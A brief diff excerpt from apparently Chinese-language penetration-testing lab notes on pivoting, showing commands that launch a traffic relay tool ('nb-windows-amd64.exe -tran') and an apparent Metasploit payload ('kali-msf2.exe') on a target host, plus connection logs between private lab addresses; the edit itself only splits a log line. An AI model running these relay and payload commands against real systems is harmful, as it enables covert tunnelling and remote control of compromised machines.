@@ -21,7 +21,8 @@ start /b nb-windows-amd64.exe -tran 9999 192.168.1.15
 2008 目标机:
 start /b kali-msf2.exe
 #win7 监听到2008的 流量表示成功
-# 2023/07/19 02:42:35.487040 [+] start connect host:[192.168.1.15:7777]
+# 2023/07/19 02:42:35.487040 [+] start conne
+ct host:[192.168.1.15:7777]
 2023/07/19 02:42:36.488442 [x] connect target address [192.168.1.15:7777] faild. retry in  5 seconds. 
 # 2023/07/19 02:42:36.488442 [←] close the connect at local:[10.30.30.133:9999] and remote:[10.30.30.131:49282]
 # 2023/07/19 02:42:36.488442 [√] accept a new client. remote address:[10.30.30.131:49283], local address:[10.30.30.133:9999]
